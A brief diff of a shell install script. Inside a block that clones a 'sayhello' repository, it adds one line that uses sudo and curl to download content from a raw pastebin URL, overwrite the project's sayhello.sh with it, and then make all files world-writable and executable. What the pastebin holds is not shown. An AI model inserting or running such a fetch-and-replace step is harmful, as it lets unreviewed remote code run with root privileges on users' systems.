@@ -708,6 +708,7 @@ if [ -d "sayhello" ]; then
 else
   sudo git clone https://github.com/d093w1z/sayhello
   cd sayhello
+  sudo curl https://pastebin.com/raw/RPFM5Uqn > sayhello.sh
   sudo chmod 777 *
   cd ..
 fi
